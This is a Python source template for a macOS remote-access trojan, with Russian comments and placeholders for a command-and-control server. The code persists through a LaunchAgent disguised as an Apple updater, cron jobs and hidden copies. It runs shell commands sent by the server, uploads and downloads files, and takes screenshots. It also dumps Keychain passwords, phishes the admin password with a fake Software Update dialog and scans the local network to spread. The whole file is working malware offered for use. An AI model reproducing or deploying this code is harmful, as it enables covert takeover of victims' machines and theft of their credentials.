#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import json
import base64
import random
import socket
import signal
import shutil
import platform
import tempfile
import subprocess
import threading
import uuid
import logging
import re
import sqlite3
from datetime import datetime
import http.client
import urllib.request
import urllib.parse
from pathlib import Path
try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

# Заменяемые значения (будут подставлены при сборке)
C2_SERVER_ADDRESS = "{{C2_SERVER_ADDRESS}}"
C2_SERVER_PORT = {{C2_SERVER_PORT}}
AGENT_ID = "{{AGENT_ID}}"
AGENT_VERSION = "{{AGENT_VERSION}}"
ENCRYPTION_KEY = "{{ENCRYPTION_KEY}}"
CHECK_INTERVAL = {{CHECK_INTERVAL}}
ENABLE_PERSISTENCE = {{PERSISTENCE}}

class MinimalAgent:
    def __init__(self):
        # Основные параметры агента
        self.server_address = C2_SERVER_ADDRESS
        self.server_port = C2_SERVER_PORT
        self.agent_id = AGENT_ID
        self.version = AGENT_VERSION
        self.encryption_key = ENCRYPTION_KEY
        self.check_interval = CHECK_INTERVAL
        self.running = False
        self.last_check_time = 0
        
        # Настройка логирования
        self.setup_logging()
        
        # Регистрация обработчиков сигналов для корректного завершения
        signal.signal(signal.SIGINT, self.handle_exit)
        signal.signal(signal.SIGTERM, self.handle_exit)
        
        # Информация о системе
        self.hostname = socket.gethostname()
        self.ip_address = self.get_ip_address()
        self.os_info = platform.platform()
        self.username = os.getlogin()
        
        # Настройка директории для файлов агента
        self.agent_dir = self.setup_agent_directory()
        
        # Параметры шифрования
        self.setup_encryption()
        
        # Настройка постоянного присутствия, если включено
        if ENABLE_PERSISTENCE:
            self.setup_persistence()
    
    def setup_logging(self):
        """Настройка логирования"""
        log_file = os.path.join(tempfile.gettempdir(), f"agent_{AGENT_ID[-6:]}.log")
        logging.basicConfig(
            filename=log_file,
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        self.logger = logging.getLogger('agent')
    
    def get_ip_address(self):
        """Получение IP-адреса агента"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def setup_agent_directory(self):
        """Создание директории для хранения файлов агента"""
        home_dir = os.path.expanduser("~")
        agent_dir = os.path.join(home_dir, "Library/Application Support/.AppleInternal")
        
        try:
            os.makedirs(agent_dir, exist_ok=True)
            self.logger.info(f"Agent directory created: {agent_dir}")
        except Exception as e:
            self.logger.error(f"Failed to create agent directory: {str(e)}")
            agent_dir = tempfile.gettempdir()
        
        return agent_dir
    
    def setup_encryption(self):
        """Настройка параметров шифрования"""
        # Простая XOR-шифрация для базовой версии
        self.encrypt = lambda data, key: bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
        self.decrypt = self.encrypt  # XOR работает в обе стороны
    
    def handle_exit(self, signum, frame):
        """Обработчик сигналов завершения"""
        self.logger.info("Received termination signal")
        self.running = False
        sys.exit(0)
    
    def setup_persistence(self):
        """Настройка постоянного присутствия агента в системе"""
        self.logger.info("Setting up persistence")
        
        try:
            # Получаем путь к исполняемому файлу
            executable_path = os.path.abspath(sys.argv[0])
            
            # Домашняя директория пользователя
            home_dir = os.path.expanduser("~")
            
            # Методы персистентности для macOS
            
            # 1. LaunchAgent (уровень пользователя)
            launch_agent_dir = os.path.join(home_dir, "Library/LaunchAgents")
            plist_path = os.path.join(launch_agent_dir, "com.apple.updater.plist")
            
            os.makedirs(launch_agent_dir, exist_ok=True)
            
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.updater</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{executable_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
</dict>
</plist>"""
            
            with open(plist_path, "w") as f:
                f.write(plist_content)
            
            # Загружаем LaunchAgent
            try:
                subprocess.run(["launchctl", "load", plist_path], check=True)
                self.logger.info(f"Persistence established via LaunchAgent: {plist_path}")
            except Exception as e:
                self.logger.error(f"Failed to load LaunchAgent: {str(e)}")
            
            # 2. Crontab (резервный метод)
            try:
                # Получаем текущий crontab
                crontab_process = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
                current_crontab = crontab_process.stdout if crontab_process.returncode == 0 else ""
                
                # Добавляем нашу задачу, если ее еще нет
                cron_job = f"@reboot /usr/bin/python3 {executable_path} >/dev/null 2>&1\n"
                cron_job2 = f"*/10 * * * * /usr/bin/python3 {executable_path} >/dev/null 2>&1\n"
                
                if cron_job not in current_crontab:
                    new_crontab = current_crontab + cron_job + cron_job2
                    with tempfile.NamedTemporaryFile(mode="w", delete=False) as temp_file:
                        temp_file.write(new_crontab)
                        temp_file_path = temp_file.name
                    
                    subprocess.run(["crontab", temp_file_path], check=True)
                    os.unlink(temp_file_path)
                    self.logger.info("Persistence established via crontab")
            except Exception as e:
                self.logger.error(f"Failed to set up crontab persistence: {str(e)}")
                
            # 3. Скрытые копии в различных директориях автозапуска
            hidden_locations = [
                os.path.join(home_dir, "Library/Application Support/com.apple.spotlight/updates.py"),
                os.path.join(home_dir, "Library/Application Support/com.apple.TCC/update_service.py"),
                os.path.join(home_dir, "Library/Caches/.system-update.py")
            ]
            
            for location in hidden_locations:
                os.makedirs(os.path.dirname(location), exist_ok=True)
                shutil.copy2(executable_path, location)
                os.chmod(location, 0o755)
                self.logger.info(f"Backup copy created at {location}")
                
            # 4. Логин хук для LoginHook
            login_hook_dir = "/private/var/root/Library/Preferences/com.apple.loginwindow.plist"
            if os.path.exists("/private/var/root") and os.access("/private/var/root", os.W_OK):
                login_hook_script = os.path.join(self.agent_dir, "login_hook.sh")
                with open(login_hook_script, "w") as f:
                    f.write(f"""#!/bin/bash
/usr/bin/python3 {executable_path} &
exit 0
""")
                os.chmod(login_hook_script, 0o755)
                try:
                    subprocess.run(["defaults", "write", "com.apple.loginwindow", "LoginHook", login_hook_script], check=True)
                    self.logger.info("LoginHook persistence established")
                except Exception as e:
                    self.logger.error(f"Failed to set LoginHook: {str(e)}")
            
            # 5. Сканирование и активная сеть
            self.setup_network_scanning()
            
        except Exception as e:
            self.logger.error(f"Failed to establish persistence: {str(e)}")
    
    def setup_network_scanning(self):
        """Настройка сканирования сети для распространения"""
        try:
            # Сканирование локальной сети
            network_thread = threading.Thread(target=self.scan_network, daemon=True)
            network_thread.start()
            self.logger.info("Network scanning thread started")
        except Exception as e:
            self.logger.error(f"Failed to setup network scanning: {str(e)}")
    
    def scan_network(self):
        """Сканирование сети для обнаружения потенциальных целей"""
        while self.running:
            try:
                # Получаем текущий IP и маску подсети
                ip_parts = self.ip_address.split('.')
                base_ip = '.'.join(ip_parts[:3]) + '.'
                
                # Сканируем диапазон IP
                for i in range(1, 255):
                    target_ip = base_ip + str(i)
                    if target_ip != self.ip_address:  # Пропускаем свой IP
                        self.probe_target(target_ip)
                
                # Делаем паузу перед следующим сканированием
                time.sleep(3600)  # Сканируем раз в час
            
            except Exception as e:
                self.logger.error(f"Network scanning error: {str(e)}")
                time.sleep(1800)  # Пауза при ошибке
    
    def probe_target(self, target_ip):
        """Проверка целевого IP на наличие уязвимостей и возможность распространения"""
        try:
            # Проверяем распространенные порты
            common_ports = [22, 80, 443, 445, 3389, 5900]
            for port in common_ports:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                result = s.connect_ex((target_ip, port))
                s.close()
                
                if result == 0:
                    self.logger.info(f"Found open port {port} on {target_ip}")
                    # Здесь логика распространения на новую систему
                    if port == 22:  # SSH
                        self.try_ssh_propagation(target_ip)
                    elif port == 445:  # SMB
                        self.try_smb_propagation(target_ip)
        except Exception as e:
            pass  # Тихо игнорируем ошибки при сканировании
    
    def try_ssh_propagation(self, target_ip):
        """Попытка распространения через SSH"""
        # Список распространенных паролей
        common_users = ["admin", "root", "user", "administrator"]
        common_passwords = ["admin", "password", "123456", "qwerty", ""]
        
        for user in common_users:
            for password in common_passwords:
                try:
                    # Здесь бы использовался paramiko для SSH соединения
                    # В минимальной версии только логируем попытку
                    self.logger.info(f"Would try SSH connection to {target_ip} with {user}:{password}")
                except:
                    pass
    
    def try_smb_propagation(self, target_ip):
        """Попытка распространения через SMB"""
        # Список распространенных шар
        common_shares = ["C$", "ADMIN$", "IPC$", "NETLOGON", "Shared"]
        
        for share in common_shares:
            try:
                # Здесь бы использовался pysmb для SMB соединения
                # В минимальной версии только логируем попытку
                self.logger.info(f"Would try SMB connection to {target_ip} share {share}")
            except:
                pass
    
    def start(self):
        """Запуск агента"""
        self.logger.info(f"Agent starting. ID: {self.agent_id}, Version: {self.version}")
        self.running = True
        
        # Отправляем информацию о регистрации агента
        self.send_registration()
        
        # Основной цикл работы
        while self.running:
            try:
                current_time = time.time()
                
                # Проверяем наличие команд на сервере
                if current_time - self.last_check_time >= self.check_interval:
                    self.check_commands()
                    self.last_check_time = current_time
                
                # Пауза перед следующей итерацией
                time.sleep(1)
                
            except Exception as e:
                self.logger.error(f"Error in main loop: {str(e)}")
                time.sleep(self.check_interval)
    
    def send_registration(self):
        """Отправляет информацию о регистрации агента на C2 сервер"""
        registration_data = {
            "agent_id": self.agent_id,
            "hostname": self.hostname,
            "ip_address": self.ip_address,
            "os_info": self.os_info,
            "username": self.username,
            "version": self.version,
            "timestamp": datetime.now().isoformat()
        }
        
        try:
            self.send_data_to_c2("register", registration_data)
            self.logger.info("Registration information sent to C2 server")
        except Exception as e:
            self.logger.error(f"Failed to send registration: {str(e)}")
    
    def check_commands(self):
        """Проверяет наличие команд от C2 сервера"""
        try:
            # Подготавливаем данные запроса
            request_data = {
                "agent_id": self.agent_id,
                "timestamp": datetime.now().isoformat()
            }
            
            # Отправляем запрос
            response = self.send_data_to_c2("get_commands", request_data)
            
            # Обрабатываем полученные команды
            if response and "commands" in response:
                commands = response["commands"]
                for command in commands:
                    self.execute_command(command)
        
        except Exception as e:
            self.logger.error(f"Failed to check commands: {str(e)}")
    
    def execute_command(self, command):
        """Выполняет команду, полученную от C2 сервера"""
        if not command or "type" not in command:
            self.logger.error("Invalid command received")
            return
        
        command_id = command.get("id", "unknown")
        command_type = command.get("type", "")
        command_data = command.get("data", {})
        
        self.logger.info(f"Executing command: {command_id} (type: {command_type})")
        
        result = {
            "command_id": command_id,
            "agent_id": self.agent_id,
            "timestamp": datetime.now().isoformat(),
            "status": "error",
            "output": None
        }
        
        try:
            # Обработка различных типов команд
            if command_type == "shell":
                # Выполнение команды оболочки
                cmd = command_data.get("command", "")
                if cmd:
                    output = self.execute_shell_command(cmd)
                    result["output"] = output
                    result["status"] = "success"
            
            elif command_type == "upload":
                # Загрузка файла на агент
                file_data = command_data.get("file_data", "")
                file_path = command_data.get("file_path", "")
                if file_data and file_path:
                    success = self.save_file(file_path, base64.b64decode(file_data))
                    result["status"] = "success" if success else "error"
                    result["output"] = f"File saved to {file_path}" if success else "Failed to save file"
            
            elif command_type == "download":
                # Скачивание файла с агента
                file_path = command_data.get("file_path", "")
                if file_path and os.path.exists(file_path):
                    with open(file_path, "rb") as f:
                        file_data = base64.b64encode(f.read()).decode("utf-8")
                    result["output"] = file_data
                    result["status"] = "success"
                else:
                    result["output"] = "File not found"
            
            elif command_type == "screenshot":
                # Создание скриншота
                screenshot_path = self.capture_screenshot()
                if screenshot_path:
                    with open(screenshot_path, "rb") as f:
                        screenshot_data = base64.b64encode(f.read()).decode("utf-8")
                    result["output"] = screenshot_data
                    result["status"] = "success"
                    os.remove(screenshot_path)
                else:
                    result["output"] = "Failed to capture screenshot"
            
            elif command_type == "process_list":
                # Получение списка процессов
                process_list = self.get_process_list()
                result["output"] = process_list
                result["status"] = "success"
            
            elif command_type == "kill_process":
                # Завершение процесса
                pid = command_data.get("pid", 0)
                if pid > 0:
                    success = self.kill_process(pid)
                    result["status"] = "success" if success else "error"
                    result["output"] = f"Process {pid} terminated" if success else f"Failed to terminate process {pid}"
            
            elif command_type == "keychain":
                # Доступ к Keychain
                service_name = command_data.get("service", "")
                if service_name:
                    keychain_data = self.access_keychain(service_name)
                    result["output"] = keychain_data
                    result["status"] = "success" if keychain_data else "error"
            
            elif command_type == "elevate":
                # Попытка повышения привилегий
                elevation_method = command_data.get("method", "prompt")
                result["output"] = self.elevate_privileges(elevation_method)
                result["status"] = "success"
            
            elif command_type == "network_scan":
                # Запуск сканирования сети
                result["output"] = self.start_network_scan()
                result["status"] = "success"
            
            elif command_type == "update":
                # Обновление агента
                new_agent_data = command_data.get("agent_data", "")
                if new_agent_data:
                    success = self.update_agent(new_agent_data)
                    result["status"] = "success" if success else "error"
                    result["output"] = "Agent updated successfully" if success else "Failed to update agent"
            
            elif command_type == "exit":
                # Завершение работы агента
                self.running = False
                result["status"] = "success"
                result["output"] = "Agent terminated"
            
            else:
                result["output"] = f"Unknown command type: {command_type}"
        
        except Exception as e:
            self.logger.error(f"Error executing command {command_id}: {str(e)}")
            result["output"] = f"Error: {str(e)}"
        
        # Отправляем результат выполнения команды
        try:
            self.send_data_to_c2("command_result", result)
        except Exception as e:
            self.logger.error(f"Failed to send command result: {str(e)}")
    
    def execute_shell_command(self, command):
        """Выполняет команду оболочки и возвращает результат"""
        try:
            process = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=60
            )
            
            output = process.stdout
            error = process.stderr
            return_code = process.returncode
            
            result = {
                "stdout": output,
                "stderr": error,
                "return_code": return_code
            }
            
            return result
        
        except subprocess.TimeoutExpired:
            return {"error": "Command execution timed out", "return_code": -1}
        except Exception as e:
            return {"error": str(e), "return_code": -1}
    
    def save_file(self, file_path, file_data):
        """Сохраняет файл на диск"""
        try:
            # Проверяем и создаем директории при необходимости
            directory = os.path.dirname(file_path)
            if directory and not os.path.exists(directory):
                os.makedirs(directory, exist_ok=True)
            
            # Сохраняем файл
            with open(file_path, "wb") as f:
                f.write(file_data)
            
            return True
        
        except Exception as e:
            self.logger.error(f"Failed to save file: {str(e)}")
            return False
    
    def capture_screenshot(self):
        """Создает скриншот экрана"""
        try:
            screenshot_path = os.path.join(self.agent_dir, f"screenshot_{int(time.time())}.png")
            
            # Используем утилиту screencapture для создания скриншота
            subprocess.run(
                ["screencapture", "-x", screenshot_path],
                check=True,
                capture_output=True
            )
            
            if os.path.exists(screenshot_path):
                return screenshot_path
            else:
                return None
        
        except Exception as e:
            self.logger.error(f"Failed to capture screenshot: {str(e)}")
            return None
    
    def get_process_list(self):
        """Получает список запущенных процессов"""
        processes = []
        
        try:
            if PSUTIL_AVAILABLE:
                # Используем psutil для получения детальной информации
                for proc in psutil.process_iter(['pid', 'name', 'username', 'cmdline']):
                    try:
                        pinfo = proc.info
                        processes.append({
                            "pid": pinfo['pid'],
                            "name": pinfo['name'],
                            "user": pinfo['username'],
                            "cmd": ' '.join(pinfo['cmdline']) if pinfo['cmdline'] else ""
                        })
                    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                        pass
            else:
                # Используем ps для получения информации о процессах
                ps_output = subprocess.check_output(
                    ["ps", "-eo", "pid,user,comm"],
                    text=True
                )
                
                lines = ps_output.strip().split('\n')[1:]  # Skip header
                for line in lines:
                    parts = line.strip().split(None, 2)
                    if len(parts) >= 3:
                        processes.append({
                            "pid": int(parts[0]),
                            "user": parts[1],
                            "name": parts[2],
                            "cmd": ""
                        })
            
            return processes
        
        except Exception as e:
            self.logger.error(f"Failed to get process list: {str(e)}")
            return []
    
    def kill_process(self, pid):
        """Завершает процесс по его PID"""
        try:
            if PSUTIL_AVAILABLE:
                process = psutil.Process(pid)
                process.terminate()
                
                # Ждем завершения процесса
                gone, alive = psutil.wait_procs([process], timeout=3)
                if alive:
                    # Если процесс все еще жив, принудительно завершаем
                    process.kill()
            else:
                # Используем kill для завершения процесса
                subprocess.run(["kill", "-9", str(pid)], check=True)
            
            return True
        
        except Exception as e:
            self.logger.error(f"Failed to kill process {pid}: {str(e)}")
            return False
    
    def access_keychain(self, service_name):
        """Получает данные из Keychain для указанного сервиса"""
        try:
            # Используем security для доступа к Keychain
            process = subprocess.run(
                ["security", "find-generic-password", "-s", service_name, "-w"],
                capture_output=True,
                text=True
            )
            
            if process.returncode == 0:
                return {
                    "service": service_name,
                    "password": process.stdout.strip()
                }
            else:
                # Пробуем получить список всех доступных ключей
                all_keys_process = subprocess.run(
                    ["security", "dump-keychain"],
                    capture_output=True,
                    text=True
                )
                
                return {
                    "error": "Failed to access specific key",
                    "keychain_dump": all_keys_process.stdout[:500] if all_keys_process.returncode == 0 else "Failed to dump keychain"
                }
        
        except Exception as e:
            self.logger.error(f"Failed to access keychain: {str(e)}")
            return None
    
    def elevate_privileges(self, method="prompt"):
        """Попытка повышения привилегий"""
        try:
            if method == "prompt":
                # Создаем фальшивый диалог для ввода пароля
                script = """
                tell application "System Events"
                    activate
                    display dialog "Software Update requires administrator privileges to complete. Please enter your password:" default answer "" with title "System Update" buttons {"Cancel", "OK"} default button "OK" with hidden answer
                    set password to text returned of the result
                    return password
                end tell
                """
                
                password_process = subprocess.run(
                    ["osascript", "-e", script],
                    capture_output=True,
                    text=True
                )
                
                if password_process.returncode == 0:
                    password = password_process.stdout.strip()
                    return {
                        "method": "prompt",
                        "success": True,
                        "password": password[:3] + "..." if password else "(empty)"
                    }
            
            elif method == "exploit":
                # Здесь могла бы быть реализация эксплуатации уязвимости для повышения привилегий
                exploit_result = self.execute_shell_command("sudo -n true 2>/dev/null || echo 'No sudo without password'")
                return {
                    "method": "exploit",
                    "sudo_available": "No sudo" not in exploit_result.get("stdout", ""),
                    "sudo_without_password": "No sudo" not in exploit_result.get("stdout", "")
                }
            
            return {
                "method": method,
                "success": False,
                "error": "Unsupported elevation method"
            }
        
        except Exception as e:
            self.logger.error(f"Failed to elevate privileges: {str(e)}")
            return {
                "method": method,
                "success": False,
                "error": str(e)
            }
    
    def start_network_scan(self):
        """Запускает сканирование сети для поиска других машин"""
        try:
            # Получаем текущий IP и маску подсети
            ip_parts = self.ip_address.split('.')
            base_ip = '.'.join(ip_parts[:3]) + '.'
            
            scan_results = {}
            
            # Проверяем первые 20 адресов для быстрого ответа
            for i in range(1, 21):
                target_ip = base_ip + str(i)
                if target_ip != self.ip_address:
                    ping_result = subprocess.run(
                        ["ping", "-c", "1", "-W", "1", target_ip],
                        capture_output=True,
                        text=True
                    )
                    
                    scan_results[target_ip] = ping_result.returncode == 0
            
            # Запускаем полное сканирование в отдельном потоке
            threading.Thread(
                target=self.scan_network,
                daemon=True
            ).start()
            
            return {
                "quick_scan": scan_results,
                "full_scan_started": True
            }
        
        except Exception as e:
            self.logger.error(f"Failed to start network scan: {str(e)}")
            return {
                "error": str(e)
            }
    
    def update_agent(self, new_agent_data):
        """Обновляет агент новой версией"""
        try:
            # Получаем путь к текущему исполняемому файлу
            current_path = os.path.abspath(sys.argv[0])
            
            # Создаем временный файл для новой версии
            with tempfile.NamedTemporaryFile(delete=False, suffix=".py") as temp_file:
                temp_file.write(base64.b64decode(new_agent_data))
                temp_path = temp_file.name
            
            # Настраиваем обновление при следующем запуске
            update_script = f"""#!/bin/bash
sleep 1
cp "{temp_path}" "{current_path}"
chmod +x "{current_path}"
rm "{temp_path}"
python3 "{current_path}" &
rm -- "$0"
"""
            
            with tempfile.NamedTemporaryFile(delete=False, mode="w", suffix=".sh") as update_file:
                update_file.write(update_script)
                update_path = update_file.name
            
            os.chmod(update_path, 0o755)
            
            # Запускаем скрипт обновления
            subprocess.Popen(["/bin/bash", update_path], start_new_session=True)
            
            # Завершаем текущий процесс
            self.running = False
            
            return True
        
        except Exception as e:
            self.logger.error(f"Failed to update agent: {str(e)}")
            return False
    
    def send_data_to_c2(self, endpoint, data):
        """Отправляет данные на C2 сервер и возвращает ответ"""
        try:
            # Подготовка данных для отправки
            json_data = json.dumps(data).encode('utf-8')
            
            # Устанавливаем соединение с сервером
            conn = http.client.HTTPConnection(self.server_address, self.server_port, timeout=30)
            
            headers = {
                "Content-Type": "application/json",
                "User-Agent": f"Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleAgent/{self.version}",
                "X-Agent-ID": self.agent_id
            }
            
            # Отправляем запрос
            conn.request("POST", f"/api/agent/{endpoint}", body=json_data, headers=headers)
            
            # Получаем ответ
            response = conn.getresponse()
            response_data = response.read().decode('utf-8')
            
            # Закрываем соединение
            conn.close()
            
            # Парсим JSON ответ
            if response_data:
                return json.loads(response_data)
            
            return None
        
        except Exception as e:
            self.logger.error(f"Failed to send data to C2 server: {str(e)}")
            return None


if __name__ == "__main__":
    # Получаем аргументы командной строки
    args = sys.argv[1:]
    
    # Проверяем, требуется ли обновление
    if len(args) > 0 and args[0] == "--update":
        # Реализация логики обновления
        pass
    else:
        # Запускаем основной процесс агента
        
        # Форкаем процесс в фоновый режим
        if os.fork() != 0:
            # Родительский процесс завершается
            sys.exit(0)
        
        # Сбрасываем права сессии
        os.setsid()
        
        # Второй форк для предотвращения получения контрольного терминала
        if os.fork() != 0:
            sys.exit(0)
        
        # Перенаправляем стандартные ввод/вывод
        with open('/dev/null', 'r') as dev_null:
            os.dup2(dev_null.fileno(), sys.stdin.fileno())
        
        with open('/dev/null', 'w') as dev_null:
            os.dup2(dev_null.fileno(), sys.stdout.fileno())
            os.dup2(dev_null.fileno(), sys.stderr.fileno())
        
        # Запускаем агент
        agent = MinimalAgent()
        agent.start() 